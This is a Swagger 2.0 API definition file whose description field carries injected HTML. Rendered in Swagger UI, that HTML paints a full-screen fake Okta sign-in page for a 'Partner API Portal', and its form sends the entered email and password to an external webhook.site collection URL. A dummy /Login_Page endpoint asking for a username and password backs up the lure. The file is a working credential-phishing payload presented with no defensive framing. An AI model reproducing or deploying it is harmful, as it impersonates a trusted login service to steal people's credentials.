swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#f7f7f8;z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:400px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:36px 36px 24px;"><div style="font-size:26px;font-weight:700;color:#00297a;font-family:Arial;margin-bottom:4px;"><span style="color:#0ea5e9;">◉</span> okta</div><div style="font-size:18px;color:#2d2d2d;margin:16px 0 4px;">Sign in</div><div style="font-size:14px;color:#626262;margin-bottom:20px;">to continue to <strong>Partner API Portal</strong></div><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="email" placeholder="you@company.com" style="width:100%;padding:12px;border:1px solid #a6a6a8;border-radius:4px;box-sizing:border-box;margin-bottom:14px;font-size:15px;"><input type="password" name="pass" placeholder="Password" style="width:100%;padding:12px;border:1px solid #a6a6a8;border-radius:4px;box-sizing:border-box;margin-bottom:10px;font-size:15px;"><div style="font-size:13px;color:#626262;margin-bottom:18px;">Forgot password?</div><button type="submit" style="width:100%;padding:12px;background:#0ea5e9;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;">Sign in</button></form></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
